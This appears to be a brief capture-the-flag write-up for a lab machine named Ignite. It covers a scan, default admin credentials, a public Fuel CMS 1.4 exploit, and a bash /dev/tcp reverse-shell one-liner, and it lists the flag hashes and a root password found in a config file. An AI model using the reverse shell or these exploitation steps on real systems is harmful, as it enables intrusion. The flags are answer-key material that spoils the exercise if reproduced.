# Ignite

### IP Address
```
10.10.235.13
```

### Scan

port | type | state | service | version
-----|------|-------|---------|--------
80 | open | tcp | http | Apache httpd 2.4.18 ((Ubuntu))
 

website running robots.txt file found with disallowed entry **/fuel/**

### Credentials found

>admin:admin

Website running on **fuelCMS v1.4**
Exploited **fuelCMS v1.4** using [exploit](https://www.exploit-db.com/exploits/47138)

created reverse shell connection using nc command

> bash -i >& /dev/tcp/10.10.235.13/4444 0>&1

### Task
user.txt
flag found in **/home** directory

>6470e394cbf6dab6a91682cc8585059b
root.txt
credential for root user found in ```fuel/application/config/database.php```
>root:mememe

root flag found in **/root/root.txt**
>b9bbcb33e11b80be759c4e844862482d
